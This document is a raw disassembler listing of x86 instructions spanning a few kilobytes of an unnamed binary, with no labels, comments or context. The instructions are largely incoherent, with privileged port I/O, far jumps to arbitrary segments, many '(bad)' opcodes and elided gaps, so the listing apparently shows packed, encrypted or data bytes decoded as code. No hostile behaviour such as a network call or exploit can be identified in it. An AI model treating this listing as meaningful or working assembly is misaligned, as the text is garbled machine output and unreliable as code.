  429560:	sub    DWORD PTR [edx+edx*4-0x4c],ebp
  429564:	fwait
  429565:	push   cs
  429566:	mov    al,0x13
  429568:	push   0x67
  42956a:	fs cld 
  42956c:	ins    DWORD PTR es:[edi],dx
  42956d:	cs ret 0x87f4
  429571:	inc    ecx
  429572:	fnstcw WORD PTR [ebx]
  429574:	pop    edi
  429575:	mov    al,ds:0x2abf6e08
  42957a:	push   edi
  42957b:	push   ss
  42957c:	push   ecx
  42957d:	mov    esi,DWORD PTR [esi+esi*2]
  429580:	cmp    eax,0xd5d23c54
  429585:	stos   DWORD PTR es:[edi],eax
  429586:	cmp    DWORD PTR [esi],0xf32c8dc8
  42958c:	sbb    eax,0xdeff31b1
  429591:	in     eax,0x63
  429593:	sub    al,dh
  429595:	cmp    edx,ecx
  429597:	mov    al,ds:0x3d3ab368
  42959c:	add    BYTE PTR [esi+0x69b00469],0x25
  4295a3:	mov    ch,0x49
  4295a5:	sub    al,0x8
  4295a7:	push   0xfffffffa
  4295a9:	ins    DWORD PTR es:[edi],dx
  4295aa:	rcl    BYTE PTR [eax+0x7fe0ddb4],0xc9
  4295b1:	out    dx,al
  4295b2:	xchg   DWORD PTR [ecx+0x1],edx
  4295b5:	sub    cl,ah
  4295b7:	or     eax,0x2cfadf0e
  4295bc:	dec    ecx
  4295bd:	fwait
  4295be:	adc    cl,dl
  4295c0:	and    dl,bh
  4295c2:	out    0x5d,al
  4295c4:	push   edx
  4295c5:	sub    ch,0x1f
  4295c8:	imul   edx,esp,0xffffff8e
  4295cb:	loopne 0x4295c9
  4295cd:	mov    al,0xd4
  4295cf:	sbb    dl,ch
  4295d1:	pop    esi
  4295d2:	and    eax,0x9d722d54
  4295d7:	in     eax,dx
  4295d8:	sbb    ecx,DWORD PTR [ebp-0x6a]
  4295db:	push   ecx
  4295dc:	cmp    ch,BYTE PTR [eax+0x78dc4713]
  4295e2:	xor    bl,BYTE PTR [ecx]
  4295e4:	in     eax,dx
  4295e5:	mov    ch,0x4c
  4295e7:	push   0xffffff91
  4295e9:	aaa    
  4295ea:	inc    ecx
  4295eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295ec:	push   esp
  4295ed:	adc    eax,0x77e88e40
  4295f2:	mov    DWORD PTR [edx+0x6a61b4b6],ebp
  4295f8:	jl     0x42959b
  4295fa:	outs   dx,DWORD PTR ds:[esi]
  4295fb:	inc    ebx
  4295fc:	ror    BYTE PTR [eax-0x12],0x94
  429600:	popf   
  429601:	jb     0x429620
  429603:	shl    BYTE PTR [esp+esi*2-0x65a8c389],0x9c
  42960b:	jecxz  0x42959e
  42960d:	mov    bh,0x4
  42960f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	frstor [edx-0x3]
  429683:	or     esi,DWORD PTR [eax-0x46]
  429686:	add    DWORD PTR [eax],eax
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	aaa    
  42968d:	pop    ebx
  42968e:	jae    0x429650
  429690:	jg     0x429619
  429692:	cmp    ecx,DWORD PTR [edi+0x1355f271]
  429698:	mov    bl,0x9b
  42969a:	mov    ebx,0x15d2bea9
  42969f:	dec    ebx
  4296a0:	jle    0x429648
  4296a2:	ja     0x429650
  4296a4:	mov    DWORD PTR [ebx-0x80],edx
  4296a7:	push   es
  4296a8:	jne    0x429691
  4296aa:	pop    edx
  4296ab:	inc    esi
  4296ac:	div    DWORD PTR [edi+ebp*1]
  4296af:	lods   al,BYTE PTR ds:[esi]
  4296b0:	aaa    
  4296b1:	mov    dl,0x37
  4296b3:	(bad)  
  4296b4:	pop    ebx
  4296b5:	fs ins BYTE PTR es:[edi],dx
  4296b7:	or     dl,ch
  4296b9:	mov    WORD PTR [eax],ss
  4296bb:	cmc    
  4296bc:	xor    al,0xb1
  4296be:	das    
  4296bf:	mov    dh,0x37
  4296c1:	loopne 0x42968a
  4296c3:	dec    eax
  4296c4:	jp     0x429698
  4296c6:	xchg   ebx,ebp
  4296c8:	dec    edi
  4296c9:	scas   al,BYTE PTR es:[edi]
  4296ca:	(bad)  
  4296cc:	(bad)  
  4296cd:	jb     0x429736
  4296cf:	mov    edi,0xe04db2c0
  4296d4:	fbstp  TBYTE PTR [eax]
  4296d6:	fild   DWORD PTR [esi+0x46a3c0d]
  4296dc:	es add al,0x62
  4296df:	push   cs
  4296e0:	adc    eax,0x2ca82be5
  4296e5:	stc    
  4296e6:	sbb    ebp,DWORD PTR ss:[ebp-0x58]
  4296ea:	dec    ecx
  4296eb:	vpsubusb xmm6,xmm3,XMMWORD PTR [edx-0x26255815]
  4296f3:	scas   al,BYTE PTR es:[edi]
  4296f4:	xchg   edi,eax
  4296f5:	jmp    0x283d:0xce2e5f41
  4296fc:	sub    bh,BYTE PTR [ecx]
  4296fe:	sub    eax,0x37071230
  429703:	rcl    DWORD PTR [ecx],cl
  429705:	jae    0x429757
  429707:	and    eax,0x81322537
  42970c:	mov    al,ds:0xa9b9a61b
  429711:	sahf   
  429712:	inc    esi
  429713:	imul   ecx,DWORD PTR [esi],0x4c86f4b2
  429719:	push   0xffffffc2
  42971b:	push   eax
  42971c:	stos   DWORD PTR es:[edi],eax
  42971d:	mov    dl,0xe0
  42971f:	daa    
  429720:	call   0x49a8:0xbb54598b
  429727:	aam    0x17
  429729:	mov    edi,DWORD PTR [ebp+0xb149560]
  42972f:	xlat   BYTE PTR ds:[ebx]
  429730:	sub    ebp,ebx
  429732:	(bad)  
  429734:	lods   al,BYTE PTR ds:[esi]
  429735:	fstp   TBYTE PTR [edx+0x15]
  429738:	jns    0x4297ac
  42973a:	ja     0x4297ac
  42973c:	push   ss
  42973d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42973e:	std    
  42973f:	or     BYTE PTR ds:0x30b83b67,dl
  429745:	xchg   esi,eax
  429746:	aad    0xe
  429748:	lds    edx,FWORD PTR [eax+ecx*8+0x20143e51]
  42974f:	mov    BYTE PTR [edx],bl
  429751:	fadd   DWORD PTR [eax]
  429753:	mov    dl,cl
  429755:	push   ss
  429756:	jmp    0xd2eb:0x46123f1a
  42975d:	lahf   
  42975e:	push   0x5b
  429760:	push   0x250cc2d9
  429765:	jne    0x429774
  429767:	pop    ss
  429768:	xor    DWORD PTR [esi-0x3237d0af],ebx
  42976e:	sub    DWORD PTR [ebx+edi*1],esi
  429771:	mov    BYTE PTR [edi],bh
  429773:	shl    BYTE PTR [ebp+0x60],cl
  429776:	push   edi
  429777:	retf   0x5ca9
  42977a:	xor    cl,BYTE PTR [edi+0xe]
  42977d:	dec    esp
  42977e:	mov    ch,bh
  429780:	push   edx
  429781:	mov    edx,0xa4e8cc0b
  429786:	xor    esi,DWORD PTR [ebx+edi*1+0x4c]
  42978a:	fs xchg edi,eax
  42978c:	mov    esi,0x71db0b
	...
  4297f1:	add    BYTE PTR [eax],al
  4297f3:	add    BYTE PTR [eax],dh
  4297f5:	inc    edx
  4297f6:	fbld   TBYTE PTR [edx-0x1]
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	add    esi,DWORD PTR [ecx+edx*1]
  429803:	pusha  
  429804:	je     0x4297c1
  429806:	add    DWORD PTR [eax],eax
  429808:	add    al,0x1
  42980a:	add    BYTE PTR [eax],al
  42980c:	ret    0x1d06
  42980f:	dec    ecx
  429810:	loop   0x42982b
  429812:	int    0x16
  429814:	loopne 0x42981b
  429816:	int3   
  429817:	add    bh,bl
  429819:	sbb    al,0xae
  42981b:	iret   
  42981c:	xchg   edx,eax
  42981d:	lahf   
  42981e:	adc    al,0x62
  429820:	mov    ch,0xf3
  429822:	pop    ss
  429823:	retf   0xe4d9
  429826:	sti    
  429827:	or     ecx,DWORD PTR [edi]
  429829:	dec    ebx
  42982a:	jge    0x42988b
  42982c:	xchg   BYTE PTR [esi+0x74],bh
  42982f:	jnp    0x429805
  429831:	or     bh,bl
  429833:	cdq    
  429834:	ret    0x6b7c
  429837:	lods   al,BYTE PTR ds:[esi]
  429838:	imul   esi,edi,0x9356c41f
  42983e:	addr16 loope 0x429814
  429841:	daa    
  429842:	ror    DWORD PTR [esi-0x45d2e54b],cl
  429848:	jb     0x4297d9
  42984a:	mov    ds:0x23e01bc7,al
  42984f:	cwde   
  429850:	retf   0xb4cb
  429853:	pop    esi
  429854:	mov    esp,0xdbead929
  429859:	das    
  42985a:	and    eax,0x648bcc0d
  42985f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429860:	gs fdecstp 
  429863:	loope  0x429890
  429865:	pop    ds
  429866:	cmp    eax,0x3b3680bb
  42986b:	loopne 0x4298bb
  42986d:	fld    QWORD PTR [edi+0x23]
  429870:	(bad)  
  429871:	(bad)  [eax+0x44]
  429874:	pop    edx
  429875:	or     BYTE PTR [edx],dl
  429877:	bound  eax,QWORD PTR [ebp*8+0x399a484f]
  42987e:	jp     0x4298c7
  429880:	fs jp  0x429899
  429883:	(bad)  
  429884:	in     eax,dx
  429885:	or     al,0x60
  429887:	test   DWORD PTR [edi],0x8a8cd68b
  42988d:	add    DWORD PTR [ebx+0xd7b5a99],esp
  429893:	aam    0xc3
  429895:	es mov ?,eax
  429898:	fwait
  429899:	mov    ah,0x35
  42989b:	pop    ss
  42989c:	call   0x1f0b:0x92576124
  4298a3:	mov    dl,0x57
  4298a5:	dec    edx
  4298a6:	pop    ebx
  4298a7:	inc    edx
  4298a8:	shr    ebp,0x76
  4298ab:	(bad)  
  4298ac:	mov    ebp,0x9dc9846c
  4298b1:	(bad)  
  4298b2:	cld    
  4298b3:	adc    al,0x91
  4298b5:	ficom  WORD PTR [edi+0x1af2ce15]
  4298bb:	and    al,0x11
  4298bd:	sbb    BYTE PTR [edx-0x3143900f],dl
  4298c3:	adc    ah,al
  4298c5:	ret    0xe9e5
  4298c8:	aas    
  4298c9:	lea    ecx,[ebp-0x716878ad]
  4298cf:	adc    BYTE PTR [esi],bh
  4298d1:	loopne 0x429875
  4298d3:	dec    esp
  4298d4:	mov    ds:0xaf06d872,eax
  4298d9:	xor    eax,0x47511701
  4298de:	sbb    eax,0x9cd5edd
  4298e3:	pop    ss
  4298e4:	push   ebp
  4298e5:	int    0xbd
  4298e7:	dec    esp
  4298e8:	pop    ds
  4298e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298ea:	add    DWORD PTR [ecx-0x6189c1d],ebp
  4298f0:	mov    eax,0x98d842ae
  4298f5:	inc    eax
  4298f6:	cmp    ah,bl
  4298f8:	aas    
  4298f9:	call   0x7fb2:0x4c38d525
  429900:	dec    eax
  429901:	push   0x36
  429903:	cdq    
  429904:	repz and DWORD PTR [eax+esi*8],esi
  429908:	call   0x56e0e0bd
  42990d:	lea    edx,[ecx]
  42990f:	sub    al,0x0
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	sbb    al,0xf8
  429982:	das    
  429983:	jae    0x4299fd
  429985:	mov    esp,0x1040001
  42998a:	add    BYTE PTR [eax],al
  42998c:	mov    ecx,0x34ab9f6e
  429991:	loop   0x4299df
  429993:	pop    ds
  429994:	sub    DWORD PTR [esi],0xfffffffa
  429997:	ins    BYTE PTR es:[edi],dx
  429998:	inc    ebx
  429999:	inc    eax
  42999a:	mov    bh,0x5e
  42999c:	punpckhwd mm2,QWORD PTR [edi+0x46]
  4299a0:	sbb    al,0x79
  4299a2:	cwde   
  4299a3:	dec    esi
  4299a4:	fs xchg esi,eax
  4299a6:	jle    0x4299d0
  4299a8:	inc    edx
  4299a9:	add    esi,DWORD PTR [ebx+0x20]
  4299ac:	daa    
  4299ad:	add    ebp,DWORD PTR [ebx]
  4299af:	cmc    
  4299b0:	pop    eax
  4299b1:	retf   0x6f08
  4299b4:	ins    BYTE PTR es:[edi],dx
  4299b5:	push   esi
  4299b6:	jnp    0x42999d
  4299b8:	outs   dx,DWORD PTR ds:[esi]
  4299b9:	out    dx,eax
  4299ba:	or     ebx,ecx
  4299bc:	imul   ebp,DWORD PTR [edi-0xf0f3de1],0xf01d6219
  4299c6:	icebp  
  4299c7:	cmp    DWORD PTR [edx],ebx
  4299c9:	lea    ebp,[ebx+0x35]
  4299cc:	xor    al,0xee
  4299ce:	sub    DWORD PTR [ecx],eax
  4299d0:	fmul   DWORD PTR [edx-0x5b03bbcc]
  4299d6:	xchg   edx,eax
  4299d7:	pop    es
  4299d8:	dec    ecx
  4299d9:	and    DWORD PTR [ebp+0x60],ebp
  4299dc:	xchg   DWORD PTR [edi+0x41301df7],esi
  4299e2:	cli    
  4299e3:	xor    al,0xc8
  4299e5:	jns    0x42996f
  4299e7:	aam    0xec
  4299e9:	test   eax,0xc911a97a
  4299ee:	and    BYTE PTR [edi],dh
  4299f0:	dec    ebx
  4299f1:	test   BYTE PTR [ecx-0x6],cl
  4299f4:	(bad)  
  4299f5:	repz mov esi,0xb92c03aa
  4299fb:	or     BYTE PTR [eax],ch
  4299fd:	pop    es
  4299fe:	adc    BYTE PTR [edi],dl
  429a00:	je     0x4299c6
  429a02:	mov    bl,0x3f
  429a04:	sahf   
  429a05:	inc    esp
  429a06:	adc    DWORD PTR [edx+esi*2],edx
  429a09:	call   0x9225f6c1
  429a0e:	dec    ebp
  429a0f:	shr    al,cl
  429a11:	and    esi,DWORD PTR [edi]
  429a13:	fdivr  QWORD PTR [esi+0x4f9c6ace]
  429a19:	cmp    bl,BYTE PTR [esi+0x6a]
  429a1c:	mov    ds:0xa81a5bc5,al
  429a21:	jl     0x429a85
  429a23:	cwde   
  429a24:	mov    ah,0x1c
  429a26:	xor    bh,BYTE PTR [edx+eax*2]
  429a29:	stos   BYTE PTR es:[edi],al
  429a2a:	cmp    ah,BYTE PTR [ecx+0x6cc2e2e7]
  429a30:	mov    ah,0x63
  429a32:	xchg   DWORD PTR ds:0x1e0141f1,edi
  429a38:	cmp    DWORD PTR [eax-0x507d0c47],ecx
  429a3e:	pop    ss
  429a3f:	fdivr  DWORD PTR [edx]
  429a41:	into   
  429a42:	stc    
  429a43:	rol    DWORD PTR [edx],cl
  429a45:	hlt    
  429a46:	test   eax,0xafaebab7
  429a4b:	out    0x7e,al
  429a4d:	icebp  
  429a4e:	(bad)  
  429a4f:	arpl   sp,si
  429a51:	jbe    0x429a23
  429a53:	ror    BYTE PTR [ebp+0x1c187643],cl
  429a59:	int3   
  429a5a:	aam    0xaa
  429a5c:	push   ebp
  429a5d:	sub    al,0x6c
  429a5f:	and    edi,ecx
  429a61:	jl     0x429a36
  429a63:	push   ebx
  429a64:	scas   al,BYTE PTR es:[edi]
  429a65:	jne    0x429a48
  429a67:	jns    0x429a69
  429a69:	pop    ss
  429a6a:	jg     0x32112547
  429a70:	push   esp
  429a71:	jge    0x429a48
  429a73:	ficomp WORD PTR [eax-0x5fca2872]
  429a79:	xor    al,BYTE PTR [esi-0x6d1e1b0d]
  429a7f:	ja     0x429a8f
  429a81:	add    BYTE PTR [ebx],bl
  429a83:	sub    ecx,ecx
  429a85:	inc    ebp
  429a86:	cmp    eax,edi
  429a88:	sbb    ch,cl
  429a8a:	mov    ch,0xe4
  429a8c:	call   0x851da2
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x74a95667
  429b01:	lods   al,BYTE PTR ds:[esi]
  429b02:	mov    bl,0xf9
  429b04:	jl     0x429ac3
  429b06:	add    DWORD PTR [eax],eax
  429b08:	add    al,0x1
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	or     esi,DWORD PTR [edi+0xf]
  429b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b10:	cdq    
  429b11:	ror    BYTE PTR [edi+0x22],1
  429b14:	mov    eax,0x48fb1abf
  429b19:	inc    eax
  429b1a:	pop    edx
  429b1b:	mov    eax,0xf8785a57
  429b20:	push   ebp
  429b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b22:	nop
  429b23:	jbe    0x429b4a
  429b25:	push   ecx
  429b26:	(bad)  
  429b27:	jns    0x429b69
  429b29:	sbb    al,0x3f
  429b2b:	mov    ah,0x41
  429b2d:	wrmsr  
  429b2f:	and    al,0xbb
  429b31:	inc    ebp
  429b32:	adc    ch,dh
  429b34:	faddp  st(7),st
  429b36:	push   eax
  429b37:	dec    BYTE PTR [ebp-0x7b]
  429b3a:	push   es
  429b3b:	out    0x23,al
  429b3d:	xor    BYTE PTR [eax+0x5f],dl
  429b40:	stos   BYTE PTR es:[edi],al
  429b41:	mov    cl,0xf5
  429b43:	sub    al,0x1c
  429b45:	inc    edi
  429b46:	jp     0x429b06
  429b48:	add    esi,ebx
  429b4a:	in     al,0x89
  429b4c:	jecxz  0x429acf
  429b4e:	out    0x7,eax
  429b50:	sbb    eax,0xc470c7b0
  429b55:	sbb    edx,ebp
  429b57:	not    DWORD PTR [ebx]
  429b59:	mov    eax,0x367d8598
  429b5e:	mov    eax,0x9aa8230b
  429b63:	stos   BYTE PTR es:[edi],al
  429b64:	cmp    al,0x41
  429b66:	(bad)  
  429b67:	bswap  eax
  429b69:	lea    esp,[esi-0x2284685a]
  429b6f:	push   esp
  429b70:	(bad)  
  429b72:	mov    eax,0xf1098415
  429b77:	aas    
  429b78:	adc    eax,0x11c0e01f
  429b7d:	stos   BYTE PTR es:[edi],al
  429b7e:	sub    al,0xda
  429b80:	loopne 0x429bed
  429b82:	mov    bh,0xa6
  429b84:	retf   0xc503
  429b87:	mov    ch,0xe
  429b89:	rdpmc  
  429b8b:	mov    ds:0xa03c410d,eax
  429b90:	rcl    DWORD PTR cs:[ebp-0x33382ba7],0xb
  429b98:	cmp    eax,0xc1744c5d
  429b9d:	sub    al,0x23
  429b9f:	xchg   BYTE PTR [ebp-0x76],cl
  429ba2:	xchg   ebp,eax
  429ba3:	xchg   ebx,eax
  429ba4:	push   esp
  429ba5:	and    eax,0x8038ae5b
  429baa:	loope  0x429bf0
  429bac:	xor    eax,0x4b6112dc
  429bb1:	bound  esp,QWORD PTR [edx-0x3733552a]
  429bb7:	jns    0x429bd3
  429bb9:	sbb    ah,BYTE PTR [ecx+0x77df3a5d]
  429bbf:	push   edx
  429bc0:	inc    ecx
  429bc1:	add    esi,DWORD PTR [ebp-0x333efbc4]
  429bc7:	inc    edx
  429bc8:	cmp    esi,0xa4345b86
  429bce:	icebp  
  429bcf:	jmp    0x419b5ac2
  429bd4:	mov    ds:0xd675f2f6,eax
  429bd9:	aad    0x41
  429bdb:	dec    ebp
  429bdc:	jg     0x429bb7
  429bde:	pop    eax
  429bdf:	enter  0xaaa8,0x87
  429be3:	xchg   ecx,eax
  429be4:	shr    DWORD PTR [ebx],0x51
  429be7:	pushf  
  429be8:	push   ecx
  429be9:	lock add DWORD PTR [edx-0x10],edx
  429bed:	sbb    DWORD PTR [ebp+0x46],0x569cef37
  429bf4:	cli    
  429bf5:	jl     0x429c3c
  429bf7:	(bad)  [edi+ebx*1]
  429bfa:	mov    eax,ds:0xf874140d
  429bff:	xchg   ecx,eax
  429c00:	in     eax,0x2e
  429c02:	add    eax,0x27f84c9d
  429c07:	test   BYTE PTR [esi+0x67cc26e6],cl
  429c0d:	out    0xd9,eax
  429c0f:	mov    es,WORD PTR [eax]
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [ebx-0x7f912187],dh
  429c85:	mov    esi,0x1040001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	xlat   BYTE PTR ds:[ebx]
  429c8d:	xlat   BYTE PTR ds:[ebx]
  429c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429c8f:	aam    0x85
  429c91:	xchg   ecx,eax
  429c92:	mov    ch,BYTE PTR [ecx+0x8]
  429c95:	xchg   DWORD PTR [esi-0x78aa8497],ebp
  429c9b:	inc    ebx
  429c9c:	xlat   BYTE PTR ds:[ebx]
  429c9d:	jge    0x429c35
  429c9f:	pop    es
  429ca0:	cmp    cl,BYTE PTR [esi+0x49]
  429ca3:	lds    esp,FWORD PTR [ebp+0x473959c8]
  429ca9:	mov    edx,esp
  429cab:	out    0x5c,al
  429cad:	sbb    dl,BYTE PTR [eiz*4-0xb4f33e5]
  429cb4:	mov    ch,0x57
  429cb6:	sub    al,0x6b
  429cb8:	and    ebx,DWORD PTR [ecx+0x2]
  429cbb:	adc    DWORD PTR [eax],eax
  429cbd:	dec    ebp
  429cbe:	pop    ebp
  429cbf:	mov    eax,0xced99cab
  429cc4:	or     BYTE PTR [edi],ah
  429cc6:	mov    ebx,0x9abd5685
  429ccb:	add    DWORD PTR [esi-0x687defb7],ecx
  429cd1:	je     0x429d16
  429cd3:	shl    al,cl
  429cd5:	inc    ebp
  429cd6:	add    esi,DWORD PTR [ebx+0x3d]
  429cd9:	cmp    ebp,DWORD PTR [edi-0x6ef3fc28]
  429cdf:	outs   dx,DWORD PTR ds:[esi]
  429ce0:	add    DWORD PTR [ecx],0xd7a7a039
  429ce6:	ret    
  429ce7:	leave  
  429ce8:	popf   
  429ce9:	sbb    ecx,DWORD PTR [ecx+0x1c]
  429cec:	xor    DWORD PTR [eax+0x7125604b],esi
  429cf2:	int    0xa7
  429cf4:	outs   dx,DWORD PTR ds:[esi]
  429cf5:	cs pop edi
  429cf7:	outs   dx,BYTE PTR ds:[esi]
  429cf8:	mov    ebx,0xfbf58554
  429cfd:	inc    esp
  429cfe:	jmp    0x5597:0xf1c54df8
  429d05:	ss mov bh,0x2c
  429d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d09:	stos   DWORD PTR es:[edi],eax
  429d0a:	jp     0x429cd4
  429d0c:	fwait
  429d0d:	aas    
  429d0e:	dec    esp
  429d0f:	push   DWORD PTR [ecx]
  429d11:	pushf  
  429d12:	sahf   
  429d13:	inc    ebp
  429d14:	sbb    al,0x8a
  429d16:	dec    esp
  429d17:	cmp    ebp,ebp
  429d19:	(bad)  
  429d1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d1b:	xchg   ebx,eax
  429d1c:	loop   0x429d50
  429d1e:	mov    eax,0x52045a57
  429d23:	lds    ebp,FWORD PTR [esi]
  429d25:	cli    
  429d26:	jle    0x429da1
  429d28:	fwait
  429d29:	push   ds
  429d2a:	rcr    BYTE PTR [eax],cl
  429d2c:	mov    ebx,0x24c9f11c
  429d31:	mov    BYTE PTR [esi],ah
  429d33:	or     BYTE PTR [ebx+edi*1],bl
  429d36:	(bad)
  429d3b:	sbb    ecx,edi
  429d3d:	sahf   
  429d3e:	push   esi
  429d3f:	cli    
  429d40:	xlat   BYTE PTR ds:[ebx]
  429d41:	(bad)  
  429d42:	mov    eax,0x19ff84ad
  429d47:	stos   DWORD PTR es:[edi],eax
  429d48:	fmul   QWORD PTR cs:[esi-0x2f87fdb4]
  429d4f:	xchg   edi,eax
  429d50:	xchg   edi,eax
  429d51:	imul   ecx,DWORD PTR [ecx-0x5ee938a1],0x63b75e76
  429d5b:	ja     0x429d5c
  429d5d:	into   
  429d5e:	mov    ebx,0x41af2641
  429d63:	pop    ds
  429d64:	push   ebx
  429d65:	jno    0x429d7c
  429d67:	clc    
  429d68:	pop    eax
  429d69:	fld    QWORD PTR [eax]
  429d6b:	ficom  DWORD PTR [esi]
  429d6d:	push   esp
  429d6e:	cdq    
  429d6f:	mov    bl,0x64
  429d71:	jp     0x429da4
  429d73:	mov    dh,BYTE PTR [edi+0x79]
  429d76:	jb     0x429d7a
  429d78:	(bad)  
  429d79:	std    
  429d7a:	dec    ecx
  429d7b:	push   ebx
  429d7c:	mov    bl,0x2a
  429d7e:	pop    esp
  429d7f:	ins    DWORD PTR es:[edi],dx
  429d80:	mov    eax,ds:0x89ea4ac9
  429d85:	mov    esp,0xe413245a
  429d8a:	mov    edx,0x66055138
  429d8f:	test   DWORD PTR [eax],0x0
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	mov    eax,0x849921dc
  429e05:	mov    edi,0x1040001
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	mov    DWORD PTR [esi-0x392be16b],ebp
  429e12:	(bad)
  429e16:	mov    ds:0x92ea3a44,al
  429e1b:	pop    edi
  429e1c:	and    BYTE PTR [ecx+0x71],ch
  429e1f:	jle    0x429dd8
  429e21:	not    DWORD PTR [ebx+ecx*8+0x2e]
  429e25:	loopne 0x429e21
  429e27:	jmp    0xdeb7:0xa6a73b9f
  429e2e:	fld    DWORD PTR [edi+0x61]
  429e31:	sti    
  429e32:	es popf 
  429e34:	sub    edi,DWORD PTR ds:0x7e4222a4
  429e3a:	daa    
  429e3b:	add    ebx,eax
  429e3d:	jno    0x429eb2
  429e3f:	fsubr  QWORD PTR [edi+esi*1+0xb29a43e]
  429e46:	fisttp DWORD PTR [eax+0x40eaa862]
  429e4c:	inc    ecx
  429e4d:	and    al,0x51
  429e4f:	and    al,0x16
  429e51:	xor    al,0x13
  429e53:	add    esi,DWORD PTR [ebx*1+0xd7105df]
  429e5a:	pop    edi
  429e5b:	pop    esi
  429e5c:	inc    esi
  429e5d:	mov    al,ds:0x70d00d12
  429e62:	scas   eax,DWORD PTR es:[edi]
  429e63:	jl     0x429e7e
  429e65:	pop    ss
  429e66:	test   eax,0xff227245
  429e6b:	div    BYTE PTR [esi+0x93ddd13]
  429e71:	sub    al,BYTE PTR [eax+0x1be69fc0]
  429e77:	test   eax,0x94043705
  429e7c:	clc    
  429e7d:	mov    ds:0x77f58883,al
  429e82:	or     ebx,ecx
  429e84:	cmp    DWORD PTR [edi-0x5b],0x1dfd8b18
  429e8b:	pop    ds
  429e8c:	sbb    bl,BYTE PTR [edi+esi*2]
  429e8f:	lods   eax,DWORD PTR ds:[esi]
  429e90:	fistp  WORD PTR [ecx+eax*8-0x5a231ca7]
  429e97:	cmc    
  429e98:	push   edi
  429e99:	into   
  429e9a:	(bad)  
  429e9b:	ins    DWORD PTR es:[edi],dx
  429e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429e9d:	out    dx,al
  429e9e:	jmp    DWORD PTR [ecx+0x5e]
  429ea1:	jae    0x429e53
  429ea3:	test   DWORD PTR [ebp-0x50e3199],esp
  429ea9:	lds    ecx,FWORD PTR [eax-0x7042410]
  429eaf:	sbb    BYTE PTR [esi],cl
  429eb1:	mov    ecx,DWORD PTR [ebx]
  429eb3:	je     0x429edf
  429eb5:	push   esp
  429eb6:	dec    esi
  429eb7:	mov    ch,0xbc
  429eb9:	and    edi,0x1d
  429ebc:	cli    
  429ebd:	xchg   ecx,eax
  429ebe:	mov    al,0x29
  429ec0:	ja     0x429e63
  429ec2:	aam    0xec
  429ec4:	(bad)  
  429ec5:	hlt    
  429ec6:	lods   eax,DWORD PTR ds:[esi]
  429ec7:	sub    eax,0xc7d40a25
  429ecc:	stos   BYTE PTR es:[edi],al
  429ecd:	mov    al,0x99
  429ecf:	mov    ah,0x7a
  429ed1:	clc    
  429ed2:	daa    
  429ed3:	in     al,dx
  429ed4:	lods   al,BYTE PTR ds:[esi]
  429ed5:	cld    
  429ed6:	cmp    DWORD PTR [edi-0x20],edx
  429ed9:	out    dx,eax
  429eda:	mov    ecx,0x4761b2e6
  429edf:	mov    eax,0x5ad124a5
  429ee4:	imul   ebx,DWORD PTR [ebx+0x2ca9a619],0x74d13c10
  429eee:	and    eax,0x1219a0cb
  429ef3:	adc    bh,BYTE PTR [ebp+0x9]
  429ef6:	sahf   
  429ef7:	(bad)  
  429ef8:	icebp  
  429ef9:	in     al,0x7e
  429efb:	xchg   esi,eax
  429efc:	xchg   ebx,eax
  429efd:	pop    ss
  429efe:	sub    eax,0x957157c
  429f03:	mov    ch,0x10
  429f05:	outs   dx,DWORD PTR ds:[esi]
  429f06:	pop    edi
  429f07:	ja     0x429f2c
  429f09:	adc    DWORD PTR [ecx],0xffffffc7
  429f0c:	aam    0x6f
  429f0e:	adc    bl,BYTE PTR [eax+0x0]
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x6d8f5c6f]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	push   ecx
  429f8d:	imul   esi,DWORD PTR [eax],0xffffffe3
  429f90:	daa    
  429f91:	iret   
  429f92:	sub    edi,0xfffffff7
  429f95:	mov    ebx,DWORD PTR [edi-0x4a847d2]
  429f9b:	arpl   WORD PTR [eax+0x1],di
  429f9e:	setp   BYTE PTR [edi-0x30]
  429fa2:	xor    bl,0xfb
  429fa5:	push   es
  429fa6:	fld    DWORD PTR [edx-0x4c]
  429fa9:	clc    
  429faa:	adc    dl,dl
  429fac:	in     al,dx
  429fad:	fmul   DWORD PTR [esi+0x24]
  429fb0:	stos   BYTE PTR es:[edi],al
